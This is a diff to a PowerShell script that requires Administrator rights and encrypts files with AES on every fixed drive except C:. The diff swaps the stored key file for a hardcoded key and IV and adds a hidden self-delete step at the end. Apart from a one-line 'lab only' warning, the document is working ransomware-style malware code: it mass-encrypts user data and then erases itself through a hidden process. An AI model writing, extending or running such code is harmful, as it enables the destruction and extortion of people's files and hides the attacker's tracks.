@@ -1,6 +1,7 @@
-# AES File Encryption Script — Stores Key/IV in external file
+# AES Encryptor with Self-Delete
+# WARNING: Use only in a controlled lab environment!
 
-# Ensure Admin Privileges
+# Ensure running as Administrator
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
     [Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Error "Please run this script as Administrator."
@@ -9,40 +10,20 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 Write-Host "Running as Administrator.`n" -ForegroundColor Green
 
-# AES Setup
+# Hardcoded AES Key and IV (Base64 Encoded)
+$Base64Key = "xv1vm/NZYeyrBvW1PKrMbNWZBZu5WrUJ0PZrAE0Q3PA="
+$Base64IV  = "7W2X2k+8bmQf3AojD7aW9w=="
+
+# Setup AES
 $AES = New-Object System.Security.Cryptography.AesManaged
 $AES.KeySize = 256
 $AES.BlockSize = 128
 $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$AES.Key = [Convert]::FromBase64String($Base64Key)
+$AES.IV  = [Convert]::FromBase64String($Base64IV)
 
-# Key file setup
-$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
-$KeyFile = Join-Path $ScriptDir "aes.key"
-
-if (-Not (Test-Path $KeyFile)) {
-    # Generate new Key and IV
-    $AES.GenerateKey()
-    $AES.GenerateIV()
-
-    $KeyText = [Convert]::ToBase64String($AES.Key)
-    $IVText  = [Convert]::ToBase64String($AES.IV)
-
-    "$KeyText`n$IVText" | Out-File -FilePath $KeyFile -Encoding ASCII -Force
-    Write-Host "Generated new AES key and IV at $KeyFile" -ForegroundColor Yellow
-} else {
-    # Load existing Key and IV
-    $KeyLines = Get-Content $KeyFile
-    if ($KeyLines.Count -lt 2) {
-        Write-Error "aes.key file is invalid or corrupted."
-        exit
-    }
-    $AES.Key = [Convert]::FromBase64String($KeyLines[0])
-    $AES.IV  = [Convert]::FromBase64String($KeyLines[1])
-    Write-Host "Loaded AES key and IV from $KeyFile" -ForegroundColor Yellow
-}
-
-# Encryption Function
+# Encrypt Function
 function Encrypt-File {
     param([string]$InputPath)
 
@@ -57,11 +38,11 @@ function Encrypt-File {
 
         Write-Host "Encrypted: $InputPath" -ForegroundColor Green
     } catch {
-        Write-Warning "Failed to encrypt ${InputPath}: $_"
+        Write-Warning "Failed to encrypt `${InputPath}: $_"
     }
 }
 
-# Get all fixed drives except C:
+# Scan all non-C fixed drives
 $Drives = [System.IO.DriveInfo]::GetDrives() | Where-Object {
     $_.IsReady -and
     $_.DriveType -eq 'Fixed' -and
@@ -85,4 +66,10 @@ foreach ($Drive in $Drives) {
     }
 }
 
-Write-Host "`nEncryption completed." -ForegroundColor Green
+Write-Host "`nEncryption completed." -ForegroundColor Yellow
+
+# ===== Self-Delete Mechanism =====
+$ScriptPath = $MyInvocation.MyCommand.Path
+$Cmd = "Start-Sleep -Seconds 3; Remove-Item -Path `"$ScriptPath`" -Force"
+Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$Cmd"
+Write-Host "Script will now delete itself..." -ForegroundColor Red
